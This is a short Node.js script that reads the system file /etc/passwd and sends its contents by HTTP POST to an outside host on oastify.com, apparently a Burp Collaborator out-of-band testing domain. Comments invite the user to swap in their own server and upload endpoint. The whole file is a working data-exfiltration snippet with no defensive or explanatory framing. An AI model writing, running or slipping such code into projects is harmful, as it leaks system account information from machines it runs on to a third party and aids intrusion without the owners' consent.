const fs = require('fs');
const http = require('http');

// Define the file path
const filePath = '/etc/passwd';

// Read the contents of the file
fs.readFile(filePath, 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading file:', err);
    return;
  }

  // Set up HTTP request options
  const options = {
    hostname: 'q2trv2ffp3j9k2ws4h7m8f8zlqrhfe33.oastify.com',
    port: 80, // Change this to your server's port
    path: '/upload', // Change this to your server's upload endpoint
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain',
    },
  };

  // Create the HTTP request
  const req = http.request(options, (res) => {
    console.log(`Server response: ${res.statusCode}`);
  });

  // Handle any errors that occur during the request
  req.on('error', (error) => {
    console.error('Error sending file:', error);
  });

  // Write the file data to the request body
  req.write(data);
  req.end();
});
